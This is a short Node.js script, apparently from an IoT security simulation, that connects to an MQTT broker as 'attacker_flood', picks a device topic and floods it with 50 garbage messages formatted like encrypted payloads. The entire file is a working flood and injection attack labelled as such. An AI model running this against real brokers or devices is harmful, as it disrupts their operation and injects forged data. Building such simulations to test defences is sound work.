import mqtt from 'mqtt';
import 'dotenv/config';

// Must target a specific topic or wildcard. 
// For simulation, we need the user to provide ID or we guess.
// We'll scan for one first.
const BROKER_URL = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';
const client = mqtt.connect(BROKER_URL, { clientId: 'attacker_flood' });

console.log('\x1b[31m😈 [ATTACK] FLOOD/DoS MODE: Preparing...\x1b[0m');

client.on('connect', () => {
    client.subscribe('device/+/data');
});

client.on('message', (topic, message) => {
    client.unsubscribe('device/+/data'); 
    
    console.log(`\x1b[31m🌊 [ATTACK] Flooding Target: ${topic}\x1b[0m`);
    
    // Send 50 garbage packets rapidly
    let count = 0;
    const interval = setInterval(() => {
        const garbage = `iv:garbage_data_${Math.random()}:tag`;
        client.publish(topic, garbage);
        count++;
        process.stdout.write('.');
        
        if (count >= 50) {
            clearInterval(interval);
            console.log('\n\x1b[31m✅ [ATTACK] Flood Complete.\x1b[0m');
            process.exit(0);
        }
    }, 10); // Every 10ms
});